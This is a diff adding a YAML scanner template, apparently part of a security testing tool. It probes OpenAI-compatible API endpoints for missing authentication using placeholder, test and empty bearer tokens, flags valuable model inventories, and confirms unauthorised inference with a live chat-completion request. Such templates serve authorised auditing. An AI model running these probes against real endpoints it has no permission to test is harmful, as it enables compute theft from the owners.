@@ -1,0 +1,136 @@
+id: openai-auth-001-unauthenticated-inference
+info:
+  name: "OpenAI-Compatible API - Unauthenticated Inference"
+  type: exploit
+  severity: high
+  author: aipostex
+  description: |
+    OpenAI-compatible endpoint allows model enumeration and inference without
+    enforcing valid authentication. This enables compute theft and unauthorized
+    use of the exposed model inventory, including placeholder-key and weak-token
+    validation patterns seen in Bizarre Bazaar-style LLMjacking.
+  reference:
+    - https://platform.openai.com/docs/api-reference/models/list
+    - https://www.pillar.security/blog/operation-bizarre-bazaar
+  tags: [openai-compatible, auth, misconfiguration, llmjacking]
+
+detect:
+  - method: GET
+    path: /v1/models
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_contains
+        value: "\"data\""
+      - type: body_regex
+        value: "(?i)\"object\"\\s*:\\s*\"list\""
+
+checks:
+  - name: "Placeholder API key accepted"
+    method: GET
+    path: /v1/models
+    headers:
+      Authorization: "Bearer sk-test-placeholder-key-00000000"
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_contains
+        value: "\"data\""
+      - type: body_regex
+        value: "(?i)\"object\"\\s*:\\s*\"list\""
+    extractors:
+      - type: json
+        name: first_model
+        path: "data.0.id"
+    severity: high
+    stage: access
+    landed: read-confirmed
+    finding:
+      title: "OpenAI-Compatible API Accepts Placeholder Key"
+      description: "OpenAI-compatible endpoint accepted a placeholder API key and exposed model inventory. First model returned: {{first_model}}."
+      remediation: "Enforce API key validation and restrict the endpoint to trusted clients."
+
+  - name: "Developer test token accepted"
+    method: GET
+    path: /v1/models
+    headers:
+      Authorization: "Bearer test-token"
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_contains
+        value: "\"data\""
+      - type: body_regex
+        value: "(?i)\"object\"\\s*:\\s*\"list\""
+    severity: high
+    stage: access
+    landed: read-confirmed
+    finding:
+      title: "OpenAI-Compatible API Accepts Developer Test Token"
+      description: "OpenAI-compatible endpoint accepted a common developer token and exposed model inventory, matching weak-auth acceptance patterns used in LLMjacking validation."
+
+  - name: "Empty bearer token accepted"
+    method: GET
+    path: /v1/models
+    headers:
+      Authorization: "Bearer "
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_contains
+        value: "\"data\""
+      - type: body_regex
+        value: "(?i)\"object\"\\s*:\\s*\"list\""
+    severity: critical
+    stage: access
+    landed: read-confirmed
+    finding:
+      title: "OpenAI-Compatible API Accepts Empty Bearer Token"
+      description: "OpenAI-compatible endpoint returned model inventory for an empty bearer token, indicating effectively absent auth enforcement."
+      evidence: |
+        Request:  GET /v1/models with "Authorization: Bearer " (empty)
+        Result:   200 OK — model inventory returned with empty credentials
+        Impact:   Auth enforcement effectively absent on the inventory endpoint (read-confirmed; see "Unauthorized inference" check for active exploit proof)
+
+  - name: "High-value model inventory exposed"
+    method: GET
+    path: /v1/models
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_regex
+        value: "(?i)(gpt-4|claude|70b|72b|90b|405b|128k|200k)"
+    severity: high
+    stage: access
+    landed: read-confirmed
+    finding:
+      title: "OpenAI-Compatible API Exposes High-Value Model Inventory"
+      description: "The exposed model inventory appears commercially valuable for LLMjacking or resale workflows."
+
+  - name: "Unauthorized inference"
+    method: POST
+    path: /v1/chat/completions
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "model": "{{first_model}}",
+        "messages": [{"role": "user", "content": "hello"}],
+        "max_tokens": 8
+      }
+    matchers:
+      - type: status
+        value: "200"
+      - type: body_contains
+        value: "choices"
+    severity: critical
+    stage: impact
+    landed: execution-confirmed
+    finding:
+      title: "OpenAI-Compatible API Allows Unauthorized Inference"
+      description: "Inference succeeded without valid authentication. The endpoint is directly exploitable for compute theft."
+      evidence: |
+        Request:  POST /v1/chat/completions (no valid auth)
+        Payload:  {"model":"{{first_model}}","messages":[...],"max_tokens":8}
+        Result:   200 OK — inference response with "choices" returned
+        Impact:   Active compute theft confirmed
